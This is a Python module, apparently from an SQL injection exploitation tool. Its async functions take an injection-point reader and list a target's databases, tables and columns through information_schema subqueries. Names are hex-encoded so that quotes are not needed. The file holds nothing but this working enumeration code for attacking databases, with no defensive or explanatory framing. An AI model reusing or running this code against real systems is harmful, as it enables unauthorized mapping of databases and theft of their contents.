from __future__ import annotations

from engine.exploit.reader import ValueReader
from engine.tamper.tampers import hexify


def _split(raw: str) -> list[str]:
    return [s for s in raw.split(",") if s]


async def list_databases(reader: ValueReader) -> list[str]:
    raw = await reader.read(
        "(select group_concat(schema_name separator 0x2c) from information_schema.schemata)"
    )
    return _split(raw)


async def list_tables(reader: ValueReader, db: str) -> list[str]:
    raw = await reader.read(
        "(select group_concat(table_name separator 0x2c) from information_schema.tables "
        f"where table_schema={hexify(db)})"
    )
    return _split(raw)


async def list_columns(reader: ValueReader, db: str, table: str) -> list[str]:
    raw = await reader.read(
        "(select group_concat(column_name separator 0x2c) from information_schema.columns "
        f"where table_schema={hexify(db)} and table_name={hexify(table)})"
    )
    return _split(raw)
